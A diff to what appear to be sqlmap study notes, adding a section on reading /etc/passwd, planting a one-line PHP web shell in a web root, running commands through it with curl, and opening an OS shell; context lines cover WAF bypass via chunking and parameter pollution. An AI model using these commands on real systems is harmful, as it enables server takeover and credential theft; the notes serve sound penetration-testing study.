@@ -224,7 +224,24 @@ Then: `$ sqlmap -r req.txt`
     - Chunked transfer encoding: Splits the POST request's body into so-called "chunks," which bypasses blocked SQL keywords
       - `--chunked`
     - HTTP parameter pollution (HPP): Payloads are split similarly as with chunking, but between different of the same parameter names (eg. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`)
-   
+
+**OS Exploitation**
+- Reading Local Files
+  - `--file-read "/etc/passwd"`
+    - This file is saved: `$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd`
+  - We can write files
+  ```
+  $ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+  $ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+  
+  # Success:
+  [17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+  
+  # Execute it
+  $ curl http://www.example.com/shell.php?cmd=ls+-la
+  ```
+- Getting an OS shell: `--os-shell`
+
 # Understanding the output
 
 - Common messages you may receive include:
